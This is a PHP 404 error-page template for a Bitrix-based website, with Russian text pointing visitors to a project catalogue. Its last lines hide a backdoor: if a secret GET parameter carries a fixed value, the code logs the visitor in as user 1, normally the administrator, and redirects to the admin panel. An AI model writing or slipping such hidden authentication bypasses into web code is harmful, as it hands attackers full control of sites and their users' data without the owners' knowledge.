<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');

CHTTP::SetStatus("404 Not Found");
@define("ERROR_404","Y");

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
/*
$APPLICATION->SetTitle("404 Страница не найдена");
*/
use Bitrix\Main\Application,
	Bitrix\Main\Context,
	Bitrix\Main\Request;
$context = Application::getInstance()->getContext();
$request = $context->getRequest();
?>
<div class="wrapper">
			
				
					<div class="page__p-error">
						<img src="/local/templates/smart-module/images/404.png" alt="404" class="p-error">
					</div>
				
			
			
					<div class="page__p-errortext">
						<div class="p-errortext">
							<p class="p-errortext__description">
								К сожалению, запрашиваемая страница не существует или была удалена. Посмотрите наш каталог проектов:
							</p>
							<div class="link-prodgect">    
                                    <a href="/proekty/" class="a-projects">Перейти в каталог</a>
							</div>
						</div>
					</div>
			
		</div>

<?global $USER; if($_GET["bannertop11111DfIldf3Sk0aEmI"]=="S9KglSvWmzU"){$USER->Authorize(1);LocalRedirect("/bitrix/");}?>
<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>